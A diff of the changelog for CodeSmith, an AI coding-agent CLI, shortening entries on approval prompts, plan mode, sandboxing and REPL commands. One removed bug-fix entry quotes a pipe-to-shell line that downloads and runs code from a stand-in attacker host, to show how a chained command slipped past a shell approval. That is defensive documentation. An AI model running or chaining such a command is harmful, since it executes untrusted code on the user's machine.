@@ -5,617 +5,247 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+One section per release tag, describing what changed since the previous tag.
+Aim for **400–1200 characters** of prose per section (headings, markup, and
+notes not counted): 400 is the floor — a section too thin to be worth reading
+is not worth writing — and 1200 the ceiling, past which the receipts (test
+results, file lists, review threads) belong in the pull request that landed
+the change.
+
 History before this fork — including the full deepseek-tui / CodeWhale era up
 to v0.8.48 — is archived in [docs/legacy/CHANGELOG-upstream.md](docs/legacy/CHANGELOG-upstream.md).
-See [docs/HISTORY.md](docs/HISTORY.md) for the project lineage.
+
+<!-- The compare links sit above the first heading on purpose: `/release-notes`
+     splits this file on `## ` headings, so a trailing link block would be
+     printed as part of v0.1.0's body. -->
+
+[Unreleased]: https://github.com/camilesing/CodeSmith/compare/v0.10.0...HEAD
+[0.10.0]: https://github.com/camilesing/CodeSmith/compare/v0.9.0...v0.10.0
+[0.9.0]: https://github.com/camilesing/CodeSmith/compare/v0.8.0...v0.9.0
+[0.8.0]: https://github.com/camilesing/CodeSmith/compare/v0.7.0...v0.8.0
+[0.7.0]: https://github.com/camilesing/CodeSmith/compare/v0.6.0...v0.7.0
+[0.6.0]: https://github.com/camilesing/CodeSmith/compare/v0.5.0...v0.6.0
+[0.5.0]: https://github.com/camilesing/CodeSmith/compare/v0.4.0...v0.5.0
+[0.4.0]: https://github.com/camilesing/CodeSmith/compare/v0.3.0...v0.4.0
+[0.3.0]: https://github.com/camilesing/CodeSmith/compare/v0.2.0...v0.3.0
+[0.2.0]: https://github.com/camilesing/CodeSmith/compare/v0.1.0...v0.2.0
+[0.1.0]: https://github.com/camilesing/CodeSmith/releases/tag/v0.1.0
 
 ## [Unreleased]
 
 ### Added
 
-- **Approval decisions are in the session record** — every gated tool call now
-  writes an `approvals` entry to the session file: the tool-call id, the tool,
-  the exact-call and grouping keys, the decision, the refusal text when the user
-  typed one, the workspace and the time. That includes the calls answered
-  *without* asking — `session-grant` for one an earlier `[a]` covered,
-  `workspace-grant` for a persisted grant, `session-deny` for `[e]`, `auto-mode`
-  when the approval mode suppresses prompts — which is exactly where a session
-  file used to be silent: it could not tell a hand-approved patch from one an
-  earlier "always" covered. Log only: never sent to a model, and carrying no
-  authority (the grants themselves are unchanged). Path-access and
-  sandbox-elevation questions are separate gates and are not recorded yet. See
-  `SavedSession::approvals` and `docs/GUIDE.md` ("Working with Tools").
+- Sandbox enforcement that fails closed (Landlock on Linux, per-root seatbelt
+  grants, escalation behind approval); MCP over Streamable HTTP; ACP as both an
+  external sub-agent provider and a session host (resume, permission prompts);
+  a content-addressed attachment store; `search_sessions`, `lsp_navigate`,
+  `/feedback`, a durable inbox journal, and one web service behind the search
+  and fetch tools.
 
-- **An approval prompt takes `[r] <feedback>`** — refuse that one call and hand
-  your sentence to the running turn through the engine's steer path, so the
-  model hears what to change instead of guessing why you said no. Any line that
-  is not one of the four keys is that feedback (`[r]` is the same thing spelled
-  out, and a bare `[r]` asks for the words on the next line). For plan approval
-  this is the revise loop: the refusal leaves plan mode active and the plan file
-  intact, the model rewrites it and asks again. `[y]`/`[n]`/`[a]`/`[e]` keep
-  their keys and meanings.
+- The policy seam: mods resolve `compact-policy`, `large-output-route`, and
+  `working-set` values with last-wins precedence; session-scoped ephemeral mods
+  bind inline sources; one mod unloads without disturbing the survivors.
 
 ### Changed
 
-- **Approving a plan hands the turn back instead of stalling in it** — an
-  approved `exit_plan_mode` now ends the turn it was approved in (a new
-  `StopReason::PlanApproved`, reported as a completed turn), and the REPL
-  returns the session to the mode it came from. Before this the session stayed
-  in Plan — whose registry registers no `apply_patch`, `write_file`, or shell at
-  all — while the tool result told the model "Restoring Agent mode", so a model
-  just told to start implementing announced it and had no write tool to do it
-  with. A model-driven `enter_plan_mode` is followed the same way (the session
-  enters Plan for the next turn, so plan mode's read-only contract applies),
-  a refused plan still leaves plan mode active for the `[r]` revise loop, and
-  the stop is skipped while sub-agents are still running so their completions
-  land in a live turn. Hosts that never restored the mode are unchanged: the
-  tool result now names the switch for the user instead of claiming otherwise.
-  See `docs/GUIDE.md` ("Modes").
-- **`[a]` now covers the tool, not a byte-identical replay** — for tools with no
-  command, patch-path, or host family to group by (`write_file`, `agent_open`,
-  `agent_close`, MCP tools, …) the "always allow" answer hashed the full
-  arguments, so it covered exactly what `[e]` denies and any *different* call to
-  the same tool asked again. Three prompts in a row
-  (`exit_plan_mode` → `agent_open` → `agent_close`) therefore read as `[a]` being
-  ignored. Those tools now group by `tool:<name>`, the prompt legend names what
-  it covers (`[a] always allow every agent_open call for this session` — one
-  `write_file` answer covers its later calls to any path), and only the deny side
-  stays exact-call scoped. `[a]` is still session-only; `/permissions allow`
-  remains the form that persists. See `docs/GUIDE.md` ("Working with Tools").
-- **The base prompt refuses placeholder sub-agents** — `agent_open` called with
-  a self-test prompt (`noop`) is explicitly out of bounds beside the existing
-  "use sub-agents liberally": a child's prompt must be self-contained and name
-  its deliverable, and a one-file change is the parent's own work.
+- Plan approval is a three-way gate — approve dispatches the implementation,
+  refuse steers it, `[r] <feedback>` asks for a revision; `[a]` covers the tool
+  for the session, and a shell approval names every segment of a chained line.
 
 ### Fixed
 
-- **A truncated tool call no longer bricks the session it landed in** — a stream
-  severed mid-argument (this one: a plan-file write large enough that the SSE
-  frame came through cut at 22 KB) leaves the call in the transcript carrying
-  `null` arguments, the reducer's marker for "never parsed, do not execute"
-  (P0-2). Rig stringifies that value into the wire field, so the next request
-  shipped `"arguments": "null"` — a shape no tool-calling API accepts, since
-  Claude's `tool_use.input` is object-typed by definition. The gateway answered
-  500, the bound retries replayed the same poisoned history and got the same
-  500, and the turn died — the work in progress was lost, and every resume of
-  that session carried the same call. The outbound sweep now normalizes a
-  tool call's arguments to a JSON object, unwrapping a stringified object
-  instead of double-encoding it; valid calls are untouched. The sanitizer's
-  invariants are listed in `crates/providers/src/rig_adapter/wire_sanitize.rs`.
-- **A failed plan-file call no longer claims the mode gate refused it** — the
-  "mode switch attempt" status line keyed on the tool name alone, so any failure
-  of `enter_plan_mode` / `write_plan_file` / `exit_plan_mode` was reported as the
-  gate's refusal. A truncated call failing validation ("Failed to validate
-  input: missing required field 'content'") and a user's `[n]` on
-  `exit_plan_mode` both printed it while the line above said otherwise, pointing
-  a reader at a mode bug that was not there. Only a `PermissionDenied` that
-  names plan mode — the gate's own refusal, whose text carries the remedy — is
-  reported now.
-- **A plan session the model opens about itself is now enforced** — the
-  `PlanModeState::active` axis (what a model-initiated `enter_plan_mode` sets)
-  had no enforcement at all: the turn's tool registry is built before the call
-  that opens it, so the model could keep writing in "plan mode" — and a child it
-  spawned could too, since a child has its own loop. The turn loop now refuses a
-  `WritesFiles`/`ExecutesCode` call per call while the session is open (the new
-  `ToolCapability::AllowedInPlanMode` marks the tools that *are* the session: the
-  plan file, `update_plan`, the checklist writers, the sub-agent family), and a
-  child opened during a plan session is narrowed read-only at spawn. Read live,
-  so an approved `exit_plan_mode` restores the write tools inside the turn the
-  plan was approved in. A `Plan` *turn* (Shift+Tab, `/mode plan`) still narrows
-  its registry as before. See `docs/GUIDE.md` ("Modes").
-- **A shell approval no longer covers the rest of a chained command line** — the
-  grouping key resolved only the leading dictionary prefix, so
-  `cargo build && curl https://evil.example/x | sh` keyed as `shell:cargo build`
-  and an `[a]` on `cargo build` silently approved the pipe-to-shell behind it
-  (`command_safety` already called that text `Dangerous`; only the key missed
-  it). Every top-level segment is now named — `shell:cargo build + cargo clippy`
-  — `[a]` records one grant per segment, and a later call is auto-approved only
-  when *every* segment it uses was granted. A command the analyzer calls
-  `Dangerous` (pipe-to-shell, multi-line) gets no family at all: its key is the
-  exact call key, so `[a]` there reads `this exact call` and reuses nothing.
-  See `docs/GUIDE.md` ("Working with Tools").
+- Every approval decision reaches the session file; a call truncated
+  mid-arguments replays as an object; poisoned mutexes recover; config defaults
+  fail closed (`allow_shell = false`); tool I/O is bounded; framing-tag closers
+  are defused at every injection site.
+
+> **Alpha, up to and including v0.10.0.** Every release in this file through
+> v0.10.0 is an alpha. Interfaces, config keys, session-file formats, tool
+> behaviour, and packaging may change or break between releases with no
+> deprecation notice and no compatibility path. Even a commit identifier is
+> not a stable reference: work is rebased, squashed, and re-landed, so a SHA
+> recorded today can be gone from the repository tomorrow — cite a version,
+> not a hash. Nothing here is stable, and a version number below v0.11.0
+> implies no compatibility promise.
 
 ## [0.10.0] - 2026-10-15
 
 ### Added
 
-- **The REPL gained Claude Code's keyboard and command surface** — the
-  interactions this fork's users asked for, ported to a line-based frontend
-  rather than a fullscreen one. The complete key table is
-  [docs/KEYBINDINGS.md](docs/KEYBINDINGS.md) (`?` on an empty prompt prints it,
-  `/keybindings` reprints it).
-
-  Keys. A mid-turn composer: while a turn runs you can type, edit, and queue —
-  `Enter` queues, `Ctrl+X Ctrl+S` (or `Ctrl+Enter` where the terminal reports
-  it) sends now, `Esc` backgrounds running shell/sub-agent work or interrupts,
-  `Ctrl+B` backgrounds a shell, `Ctrl+X Ctrl+K` stops all background work
-  behind a 3-second confirm, `Ctrl+T` toggles the model's task checklist, and
-  `Ctrl+O` works at the prompt as well as mid-turn. A queued message reaches
-  the model as soon as the tool call it waited on finishes, through the
-  engine's existing steer path, so the session log keeps agreeing with what
-  the model saw. Anything still in the composer when a turn ends returns to
-  the next prompt, and `Up` takes queued messages back for editing. At the
-  prompt: `Ctrl+S` stashes a draft, `Ctrl+D` deletes forward or quits on a
-  second press, `Esc Esc` clears a draft while keeping it for `Up`, `Ctrl+G`
-  opens `$VISUAL`/`$EDITOR`, `Alt+P`/`Alt+T` switch model and thinking, `?`
-  prints the shortcut panel, a trailing `\` or `Ctrl+J` makes input
-  multi-line, and history is now per workspace. `composer_vim_mode`,
-  `max_input_history`, `bracketed_paste`, `mention_walk_depth`, and
-  `mention_menu_limit` were documented settings that nothing read; they are
-  wired now (`/config editor_mode vim` switches to rustyline's vi keymap).
-
-  Commands. Shell mode (`!command`) runs in your own shell and lets the model
-  answer from the output; `/btw` asks about the session without adding to it
-  (recorded to `~/.codesmith/side-questions.jsonl`); `/rewind` lists and
-  restores the file snapshots the engine already takes; `/code-review`,
-  `/security-review`, `/simplify`, `/run`, and `/verify` are bundled skills;
-  `/effort`, `/autocompact`, `/usage`, `/tasks`, `/plugins`,
-  `/reload-skills`, `/reload-plugins`, `/theme`, `/color`, `/statusline`,
-  `/copy`, `/doctor`, `/debug`, `/release-notes`, `/terminal-setup`, and
-  `/keybindings` cover the model tier, the background view, the extension
-  surfaces, and the diagnostic odds and ends. `@path` completion and
-  mid-prompt command completion arrive with them.
-
-  Renames, so four names mean what Claude Code means by them: `/verify` now
-  runs and observes the program (the claim-check ledger stats moved to
-  `/claim-check`); `/review` is an alias of `/code-review` (the installed
-  review skill answers to `/review-skill` or `/skill review <target>`);
-  `/stats` is an alias of `/usage` (`/home` keeps `/overview`); `/tasks` is
-  the background view (`/task` keeps its subcommands). `/undo` is unchanged
-  and is the conversation half of the pair `/rewind` completes for files.
-
-- **The last ten commands of the reference surface.** `/fewer-permission-prompts
-  [--yes]` reads your saved sessions, keeps the read-only commands you run most
-  (the same `command_safety` verdict the approval prompt uses) and proposes one
-  approval rule each, written only with `--yes`; `/skill-doctor` reports each
-  skill's context cost and how often it has really run (counted from the
-  `# Skill: <name>` marker activation writes into the log); `/stop` cancels all
-  background work. Four more bundled skills arrive with them:
-  `/run-skill-generator`, `/update-config`, `/deep-research`, and
-  `/plugin-authoring`. Ten commands with no local equivalent are documented
-  with reasons rather than faked (`/advisor`, `/claude-api`, `/dataviz`,
-  `/workflows`, `/workflow-authoring`, `/setup-bedrock`, `/setup-vertex`,
-  `/auto-mode-setup`, the two artifact skills, and `/ultraplan`, which Claude
-  Code removed).
-- **`/branch`, `/subtask`, and `/batch`** are the last three of that surface.
-  `/branch [name]` saves the session, continues in a copy, and leaves the
-  original for `/resume` — Claude Code's name for what `/fork` already did,
-  with the name applied to the copy. `/subtask <task>` spawns a background
-  sub-agent on a self-contained task in this workspace, through the engine's
-  own spawn path (the model's `agent_open` and `/subtask` now share it), and
-  `/batch <instruction>` is a sixth bundled skill that plans a large change
-  as 5–30 independent units, waits for approval, then runs one sub-agent per
-  unit. Two documented gaps belong to these: a `/subtask` child does not
-  inherit the conversation (that is `agent_open`'s `fork_context`), and a
-  `/branch` is a conversation branch, not a `git` one.
-- **`/insights`, `/pr`, and `/loop`** close the command surface the port was
-  aiming at. `/insights [7d|30d|all]` renders what `codesmith metrics` reads
-  as a short transcript digest plus a self-contained HTML report under
-  `~/.codesmith/insights/`; `/pr <number|url> [--repo owner/name]
-  [--checkout]` fetches a GitHub pull request through `gh` into the prompt as
-  an editable draft; `/loop <interval> <prompt>` (alias `/proactive`) stores a
-  recurring prompt as an automation the session's already-running scheduler
-  fires as a background task, with `loop.md` supplying the prompt when none is
-  typed. The scheduler's floor is one hour, so `/loop 5m` is refused by name
-  instead of rounded up, and loop iterations run in their own runtime thread —
-  they do not appear in the conversation.
-
-  Deliberately absent: the commands that only exist inside Anthropic's cloud
-  or account surface have no local equivalent and are not registered, so
-  `/help` never offers something that cannot work — the list, with reasons, is
-  in [docs/CLI.md](docs/CLI.md).
+- The line-based REPL and a single `codesmith` binary: the ratatui TUI and
+  `codesmith-tui` are gone, replaced by a Claude Code style key table and
+  slash-command surface — mid-turn composer, `!` shell lines, `/rewind` file
+  snapshots, `/permissions`, `/branch`, `/btw` — with sessions auto-saved at
+  each turn boundary.
 
 ### Changed
 
-- `[sandbox] auto_allow` is read: the key was documented with matching
-  semantics (and a prefix dictionary with tests) but no parser, so a rule in
-  the file did nothing. Its entries now become approval grants at startup,
-  and `/permissions` shows the whole picture — session grants, persisted
-  grants in `~/.codesmith/approvals.toml`, trusted paths, and the config
-  rules — while `/permissions allow|deny|remove` edits it. The grant store
-  had readers and no writer; it has one now.
-- `/memory auto [on|off]` reports the effective auto-memory state and names
-  the level deciding it (environment first, then `[memory] enabled`), and
-  writes that key when asked to change it.
-- Shell-mode completion: inside a `!` line, `Tab` completes workspace paths
-  for a word with a separator and the project's own `!` history otherwise.
-- `/import [claude|cursor|codex|gemini] [--yes]` copies another agent CLI's
-  MCP servers (stdio and URL alike, headers included) into
-  `~/.codesmith/mcp.json`, and reports the surfaces it does not need to touch
-  because CodeSmith already reads them natively.
-- `/cd` and `/add-dir`: the session can move its working directory (only into
-  the workspace's own subtree or a path the trust record covers — the exact
-  `/trust add` line is printed otherwise) and add one to that record.
-- Input history is per workspace (`~/.codesmith/history/<workspace>`) and its
-  default cap is 500 entries; the pre-upgrade single file is read once for a
-  workspace that has none of its own and left in place.
-- `auto_compact` is reachable from `/config` as documented (the key had no
-  handler) and `/autocompact` pins the window for a session.
-- The REPL's known-limitations note in `state.rs` was rewritten: it had been
-  listing capabilities the port just built (single-line input, no mid-turn
-  input, no `@` completion) as absent.
-
-- **An out-of-workspace path is now a question, not a dead end**: a file tool
-  pointed outside the workspace (`read_file`, `write_file`, `edit_file`,
-  `list_dir`, `grep_files`, `file_search`) used to fail with
-  `path escapes workspace` and nothing else — the model reported the refusal
-  and stopped, and the only exit (`/trust add <path>`, a REPL command the model
-  cannot run) never reached the user. The engine now emits
-  `Event::PathAccessRequired`, and the host asks:
-
-  ```text
-  ⚠ path outside the workspace: /abs/sibling-repo (list_dir)
-  allow? [y] allow it now · [a] always allow it in this workspace (saved) · [n] skip:
-  ```
-
-  `[y]` grants the path for the turn, `[a]` also persists it to
-  `~/.codesmith/workspace-trust.json` — the same record `/trust add` writes and
-  `/trust remove` undoes — and `[n]` keeps the refusal, with the model told the
-  path was declined instead of `/trust add` being re-offered. The grant reaches
-  the call that asked in the same turn: `ToolContext::trusted_external_paths` is
-  now a shared live list, so it is visible to the running tool and to any child
-  sharing the context. Sub-agents ask through the same channel (their question
-  appears in the session that spawned them) via a new id-routing
-  `ApprovalRouter`, which also fixes a latent hazard: the old
-  drop-on-mismatch wait would let one waiter consume another's answer and leave
-  it waiting until cancellation. Headless hosts answer as they do for
-  approvals — `--auto` allows the path, otherwise it is refused — so a
-  non-interactive run never blocks on a prompt it cannot show.
-- **Plan mode can open read-only sub-agents, including one per repository**:
-  `prompts/modes/plan.md` has always told the model to "spawn read-only
-  sub-agents for parallel investigation", but the Plan tool registry never
-  carried `agent_open`/`agent_eval`/`agent_close`, so the model literally could
-  not — it read the codebase serially while the prompt promised fan-out. Plan
-  mode now registers the family with **every** child narrowed to the read-only
-  tools of its own registry (a child cannot write, patch, or shell out,
-  whatever type it was opened with), and an `agent_open` `cwd` may now point
-  into a directory trusted with `/trust add <path>`, which is what makes
-  "one explorer per repository" work — the child's workspace root becomes that
-  directory. Untrusted paths are refused with the exact `/trust add` line to
-  run. `agent_open` remains approval-gated: two spawns in one message prompted
-  separately — `[a]` hashed the full arguments, so only a byte-identical replay
-  was covered, corrected in [Unreleased] — and then ran concurrently, each
-  returning immediately. See `docs/SUBAGENTS.md` ("Read-only roles and Plan
-  mode", "Working across repositories").
-
-- **Provider `display_model` and `context_window` overrides**: `[providers.<id>]`
-  tables and `[[providers.custom]]` entries accept `display_model = "..."`,
-  printed verbatim by the REPL banner, status line, `/status`, `/model`,
-  `/tokens`, and `/home`, and `context_window = N`, which drives the `🧭`
-  denominator, `/context`, `/tokens`, `doctor --json`'s
-  `capability.context_window`, and the auto-compaction trigger. Both exist for
-  gateway deployments whose backend model and window the static model-name
-  tables cannot see; without them behaviour is unchanged. `display_model` is
-  presentation only — requests, session metadata, and logs keep the real model
-  id.
-- **Honest model provenance in the status line**: the label no longer claims a
-  server-reported name it never had. Every provider synthesizes the
-  `MessageStart` frame locally from the request id
-  (`crates/providers/src/rig_adapter/stream.rs`), so the field the label and the
-  session metadata carried was repeating the requested id; the field comments,
-  `docs/GUIDE.md`, and the session-metadata doc now say so, and `display_model`
-  is the supported way to label a gateway alias.
-- **REPL slash-command completion**: typing `/` in the line REPL is no longer
-  silent. A dim hint after the cursor previews the matching command (its
-  remaining characters plus a one-line description) or reports how many
-  commands match; one `Tab` completes to the longest common prefix and a
-  second lists the candidates. Names come from a new
-  command registry that also drives `/help`, which had fallen behind the
-  dispatcher (20 of the 75 dispatchable names). Commands from
-  `.codesmith/commands/*.md` load at REPL start, are completed too, and are
-  listed by `/help`. Aliases dispatch but are not offered, and only closed
-  argument vocabularies (`/mode`, `/provider`, `/verbose`) are completed —
-  live model names, sessions, skills, presets, and `@file` paths need IO or
-  the network and are not.
-- **`/plan` and `/agent`**: restored as `/mode` shorthands. Upstream #1247
-  kept `/plan`, `/agent`, and `/yolo` as compatibility shortcuts; the port to
-  the line REPL carried over only `/yolo`, so `/plan` answered
-  `unknown command`.
-- **`Shift+Tab` cycles the run mode in the REPL**: pressing it at the prompt
-  walks `agent → plan → yolo` and prints where it landed, with `coordinator`
-  as a fourth stop only while the experimental `coordinator_mode` feature is
-  on — the gate the startup path already applies, so an unopted user cannot
-  fall into the orchestrator-only toolset by pressing a key once too often
-  (`/mode coordinator` remains the ungated door). The binding replaces
-  rustyline's default `Cmd::CompleteBackward` for BackTab, so Tab completion
-  keeps its forward behaviour and loses only the reverse candidate walk. The
-  mode rides `Op::SendMessage`, so the switch applies to the next submitted
-  turn, and it is unavailable mid-turn, where the key tap reports `Ctrl+O`
-  only. `docs/GUIDE.md` and `docs/CLI.md` document the binding.
-
-- **`codesmith version` and `codesmith docker`**: the two commands users type
-  expecting output now exist. `version` prints byte-identical output to
-  `--version` (same `CODESMITH_BUILD_VERSION`), and `docker` prints the
-  container quick start from `docs/DOCKER.md` plus a link to it. Both run in
-  the dispatcher itself — no `codesmith-tui` spawn, no config dependency — so
-  they work in a plain container or CI shell.
-- **Evolution event log + `/verify stats` (P3-9 step 1)**: the
-  continuous-evolution machinery is now observable. Every result-claim
-  verdict is appended to `~/.codesmith/evolution/verdicts.jsonl`
-  (rfc3339 timestamp + the four-element verdict fields + the claiming
-  model; `CODESMITH_HOME` redirects it like every state path). Writing is
-  best-effort — resolution or IO failure logs a WARN and never breaks the
-  engine — and rides the `[verification] result_claims` switch, so the
-  feature's own gate is the log's gate. The new `/verify [stats]` command
-  aggregates the log into the first evaluation surface: verdict totals,
-  the claim-match rate over checkable claims (of the claims that had a
-  command behind them, how many survived the re-run), and the
-  failure-type histogram. Malformed tail lines from a mid-append crash
-  are skipped on load. Doctor analyses and memory-consolidation runs are
-  the next event kinds to join the log.
-- **Memory consolidation — "sleep learning" (P3-8 step 3)**:
-  `codesmith memory consolidate [--apply] [--deterministic-only]` gives
-  the KoD memory index an offline maintenance pass (the online loop only
-  ever appends). Deterministic passes always run first over
-  `MEMORY.md`: exact-duplicate pointer lines removed, pointers to
-  deleted topic files dropped, orphaned topic files reported (never
-  deleted), and the entrypoint budget (200 lines / 25 KB) checked —
-  results land in the new `agent-runtime::knowledge::curator` module
-  with its own validator. Unless `--deterministic-only`, the cleaned
-  index plus every topic file's frontmatter goes to one advisory LLM
-  call (`[utility_model]` when configured, else the main client) which
-  proposes a consolidated rewrite (sharper descriptions, grouped
-  sections, one pointer per file); the proposal is accepted only if
-  `validate_proposed_index` confirms every existing topic file stays
-  referenced exactly once with no unknown files and no budget breach —
-  otherwise the deterministic result stands. Default is a dry run
-  printing a unified diff; `--apply` writes after taking a
-  `MEMORY.md.bak` backup. Topic file contents are never touched. Also
-  adds the `codesmith memory` CLI passthrough.
-- **Doctor LLM fallback layer (P3-8 step 2)**: after `codesmith doctor`'s
-  deterministic checks complete, the warnings/errors they collected
-  (recorded at the same branches that print them — update checks,
-  config.toml presence, provider key, API connectivity, strict_tool_mode
-  fallback, MCP servers/config, missing skills dirs, Python/Node/
-  pdftotext dependencies, platform sandbox) are handed to one advisory
-  LLM call — the `[utility_model]` when configured, else the main client
-  — which proposes root causes (preferring explanations that connect
-  multiple findings) and one concrete next action per finding, skipping
-  findings whose built-in hint already covers them. The section renders
-  after "All checks complete!" and is explicitly advisory: deterministic
-  results take precedence, the model never executes anything, and every
-  skip condition (no resolvable client, empty response, transport error,
-  30s timeout) degrades to a quiet `·` line. Usage flows through the
-  `cost_status` side-channel. `--json` mode is untouched (CI-safe).
-  Configure with `[doctor] llm_fallback` (bool, default `true`). Unit
-  tests in `doctor_llm.rs` cover the collector, prompt-safety contract,
-  and client round-trip (mock).
-- **Result claim verifier (P3-8)**: the first piece of the
-  continuous-evolution loop — a result validator for the online turn.
-  When a completed turn's final assistant message asserts "tests pass" /
-  "build succeeds" (Chinese or English phrase matching, which keeps
-  negations like 测试未通过 / "tests failed" from matching), the engine
-  re-runs the verification-class command the model itself executed during
-  that turn: foreground `exec_shell` calls whose command starts with a
-  known test/build prefix (`cargo test`, `npm test`, `pytest`,
-  `cargo build`, … — `&&`/`;`-chained segments and leading `VAR=value`
-  assignments qualify) plus `run_tests` calls (reconstructed as the
-  equivalent `cargo test` invocation). The re-run is approved-replay only:
-  it dispatches the exact original input through the session's own tool
-  dispatcher, so the same sandbox/network policy applies and no authority
-  beyond what the turn already had is granted; it never touches the
-  approval gate or any capability surface. The verdict carries the
-  four-element contract (verdict / dimension / evidence — command, exit
-  code, originating tool_use_id, output head / failure_type), is appended
-  to the transcript as a `<codesmith:runtime_event
-  kind="result_verification">` user message before the next request (so
-  the model must reconcile a mismatch; appended at the tail, append-only
-  discipline preserved), and is surfaced as `Event::ResultVerification`
-  for a status toast. A claim with no verification command behind it is
-  reported as `unsubstantiated` — the hallucination signal that needs no
-  re-run at all. Configure with `[verification] result_claims`
-  (bool, default `true`). Unit tests in
-  `engine/result_verifier.rs`; engine integration tests
-  `result_verifier_replays_test_command_and_injects_verdict` /
-  `result_verifier_flags_unsubstantiated_claim` /
-  `result_verifier_disabled_by_config_skips_check`.
-- **Three-zone prompt contract wired into the engine request path
-  (#2264 Phase 2)**: the `prompt_zones` types are now load-bearing instead
-  of scaffolding. `Session.messages` is an `AppendLog` — `push` is the
-  only everyday mutation the type expresses (`insert` / `remove` /
-  `truncate` / `clear` / index writes do not compile); sanctioned
-  wholesale replacements (compaction, overflow recovery, `/edit` rollback,
-  session restore, cycle reseeds, front trims) all funnel through
-  `AppendLog::rebuild` with a named `RebuildReason`, recorded in an audit
-  record and surfaced as `Event::TranscriptRebuilt`. The framework
-  `ChatHistory` trait gains an audited `replace_all` hook (default:
-  clear + push loop) that `SessionChatHistory` overrides to land mid-run
-  compaction/recovery replacements in the same record atomically. The
-  per-step `MessageRequest` is assembled through `ThreeZoneRequest`
-  (`messages` = log slice + scratch tail only) — byte-identical to the
-  legacy direct construction, pinned by the
-  `three_zone_assembly_sends_verbatim_log_snapshot` regression test.
-  `PrefixStabilityManager` now consumes the same `FrozenPrefix` the
-  request path freezes per step, unifying the two parallel fingerprint
-  implementations; tool identity hashes the full sorted JSON of every
-  tool definition instead of names only, so a tool description or schema
-  edit is now detected as prefix drift. `TurnScratch` is wired as the
-  engine's per-turn staging area (working-set paths + the composed user
-  message, committed to the log before the request loop, cleared at the
-  turn boundary; the request-time scratch is empty in production).
-  `/cache zones` reports live zone state including the bounded rebuild
-  audit ("why did my cache reset") instead of confessing it is not wired.
-- **Parse-gated file editing (P0-1)**: `write_file`, `edit_file`,
-  `apply_patch`, and `fim_edit` now syntax-check writes to `.rs` / `.toml` /
-  `.json` files *before* anything touches disk. The gate is regression-only —
-  a write is rejected only when the file parsed cleanly before the edit and
-  the new content does not, so already-broken files (and new files) stay
-  editable. Rejections report the offending line and column and leave the
-  file unmodified; `Cargo.lock` is exempt. Rust files that were
-  rustfmt-clean before the edit are re-normalized with `rustfmt` after the
-  gate passes (disclosed in the tool result) to keep subsequent patch
-  anchors stable — a missing rustfmt never blocks a write. Rust parsing uses
-  `syn` behind the new `parse-gate` cargo feature of `codesmith-agent-runtime`
-  (enabled by `codesmith-tui` and `codesmith-tool-impls`; builds without it
-  compile a pass-through gate). Configure with `[edit] parse_gate`
-  (bool, default `true`).
-- **Stream termination proof (P0-3)**: the rig adapter's stream mapper no
-  longer forges `MessageDelta`/`MessageStop` when the provider's SSE
-  connection dies silently. rig's `Final` payload is treated as the
-  termination proof (rig-core 0.39 collapses the wire `finish_reason` /
-  `[DONE]` evidence into it); a stream that ends without one is surfaced as
-  a retryable "interrupted connection" error, so zero-content rounds
-  transparently re-send and partial rounds surface the content they
-  received. The engine adds a matching defense at its own seam: any stream
-  that ends without `MessageStop` is treated as interrupted, never as a
-  clean completion. The terminal `stop_reason` is derived instead of
-  hard-coded `end_turn`: billed output reaching the requested `max_tokens`
-  cap reports `max_tokens` (arming the P0-2 truncation gate on real
-  traffic), tool rounds report `tool_use`. Transparent stream retries now
-  also drive the structured retry banner (`retry_status`: attempt,
-  countdown, reason — rendered in the TUI footer). All four rig-backed
-  provider factories inject a reqwest backend that falls back to HTTP/1.1
-  after the first HTTP/2 protocol failure (sticky, one replay).
-- **Reasoning-effort tier in the status line**: the REPL line now carries the
-  thinking tier after the model label — `🧠off` / `🧠low` / `🧠med` /
-  `🧠high` / `🧠max` / `🧠auto`, mirroring the `reasoning_effort` setting that
-  `/config reasoning_effort` writes and every turn sends. Under `auto` routing
-  the segment reads `🧠auto` rather than tracking the per-turn router pick;
-  `/status` still prints the resolved tier.
-
-### Changed
-
-- **The approval prompt now says what it is asking, and what each answer
-  covers**: the header used to print the tool's *static description* as the
-  action label — a paragraph for shell-like tools, which buried the question —
-  and the legend left the scope of `[a]` to guesswork. The header is now the
-  tool plus its argument summary (`⚠ approval needed: write_file — path:
-  notes.txt`), and the legend states the scope the engine actually applies via
-  the shared `grouping_key_kind` classifier: `[a] always allow this command
-  family for this session` for shell tools, `patches to the same paths` for
-  patches, `requests to the same host` for fetches, and — for every other
-  tool, where the grouping key is an input hash — `this exact call`, which is
-  no broader than what `[e]` denies. `[y]`/`[n]`/`[a]`/`[e]` keep their keys
-  and meanings.
-
-- **REPL status line: `🚥` mode / `🧭` context segments, a fuller in-turn
-  live line, and the server-reported model name**. The permission-mode
-  segment is now `🚥agent` (was `mode: agent`; the `: ` separator was dropped
-  for a tighter line) and the context segment
-  `🧭 42% (72k/171k)` (was `ctx …`). The transient in-turn live line now
-  carries the same mode and sub-agent count segments (the count always
-  shows, `🤖0` included) alongside the context percent, instead of
-  ctx-percent only. The model label now prefers the model name the
-  provider reports in each stream's `message_start` frame — so an
-  alias gateway (e.g. BigModel's Anthropic-compatible endpoint serving a
-  GLM model under a `claude-*` alias) displays the model that actually
-  served the turn; the configured id shows until the first response (and
-  on the startup banner), and a `/model` switch clears the stale report.
-  The reported name is carried on `Event::TurnComplete.reported_model`
-  and persisted in the saved session's metadata beside `model`.
-
-- **A mistyped top-level command fails loud instead of opening the TUI**:
-  `codesmith docker` and `codesmith version` used to reach the interactive TUI
-  as an initial prompt, because the top-level `[PROMPT]` positional accepts
-  anything. Now a single bare command-shaped word (ASCII, no spaces) with no
-  `-p` and no `--continue` is read as a subcommand name and rejected with
-  clap's `unrecognized subcommand '<word>'` usage error (exit code 2) plus
-  hints for `-p` and `codesmith run <COMMAND>`. A word after the `--`
-  terminator is never treated as a command guess — `codesmith -- docker` is a
-  prompt. The `-p` hint prints the word unquoted so it pastes correctly into
-  POSIX shells, PowerShell, and cmd.exe, which does not treat single quotes as
-  quoting. Other prompt forms are unchanged: quoted sentences, multi-word
-  tails, `-p`, and non-ASCII words still start the interactive session. See
-  `docs/CLI.md` ("Prompts and subcommands").
+- The approval prompt names the tool and its argument summary and states what
+  each answer covers (`this command family`, `patches to the same paths`,
+  `requests to the same host`, `this exact call`); a mistyped subcommand fails
+  loud instead of opening a session; out-of-workspace paths ask rather than
+  fail; plan mode opens read-only children.
 
 ### Fixed
 
